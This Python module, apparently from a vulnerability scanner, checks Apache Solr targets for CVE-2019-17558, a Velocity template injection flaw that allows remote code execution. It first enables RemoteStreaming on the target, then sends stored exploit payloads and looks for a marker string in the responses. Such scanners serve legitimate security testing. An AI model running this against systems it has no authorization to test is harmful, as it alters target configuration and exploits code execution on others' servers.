#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2019_17558_scan(self, url):
        ''' 5.0.0版本至8.3.1版本中存在输入验证错误漏洞, 
            攻击者可借助自定义的Velocity模板功能, 利用Velocity-SSTI漏洞在Solr系统上执行任意代码
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2019-17558'
        # vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        self.enable(url)                    # * 此漏洞需要启用Solr的RemoteStreaming功能
        if not self.params:
            return None

        for payload in self.cve_2019_17558_payloads:
            path = payload['path'].format(self.db_name)
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG


                # todo 判断
                if (self.md in check.check_res(res.text, self.md) ):
                    results = {
                        'Target': target,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Request': res
                    }
                    return results

            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None
